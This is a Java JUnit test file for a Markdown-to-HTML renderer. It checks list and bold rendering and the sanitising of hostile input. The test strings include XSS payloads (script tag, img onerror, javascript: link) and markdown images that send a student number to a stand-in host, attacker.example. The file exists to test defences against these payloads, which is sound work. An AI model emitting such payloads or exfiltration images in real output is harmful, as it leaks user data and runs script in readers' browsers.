package kmo.dev;

import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

import org.junit.jupiter.api.Test;

class MarkdownRendererTest {

    private final MarkdownRenderer renderer = new MarkdownRenderer();

    @Test
    void rendersBoldAndLists() {
        String html = renderer.toHtml("* **Informatik:** 3 Studenten\n* **BWL:** 2 Studenten");
        assertTrue(html.contains("<ul>"));
        assertTrue(html.contains("<strong>Informatik:</strong>"));
    }

    @Test
    void escapesRawHtml() {
        String html = renderer.toHtml("<script>alert(1)</script> <img src=x onerror=alert(1)>");
        assertFalse(html.contains("<script>"));
        assertFalse(html.contains("<img"));
    }

    @Test
    void dropsJavascriptLinks() {
        String html = renderer.toHtml("[klick](javascript:alert(1))");
        assertFalse(html.contains("javascript:"));
    }

    @Test
    void doesNotRenderImages() {
        String html = renderer.toHtml("Text ![Matrikel 12348](https://attacker.example/collect?student=12348) Ende");
        assertFalse(html.contains("<img"));
        assertFalse(html.contains("attacker.example"));
        assertTrue(html.contains("Matrikel 12348"));
        assertTrue(html.contains("Ende"));
    }

    @Test
    void doesNotRenderNestedImages() {
        String html = renderer.toHtml(
                "![outer ![secret](https://attacker.example/collect?student=12348)](https://example.org/outer)");
        assertFalse(html.contains("<img"));
        assertFalse(html.contains("attacker.example"));
    }

    @Test
    void doesNotRenderReferenceStyleImages() {
        String html = renderer.toHtml("![x][r]\n\n[r]: https://attacker.example/collect?student=12348");
        assertFalse(html.contains("<img"));
        assertFalse(html.contains("attacker.example"));
    }
}
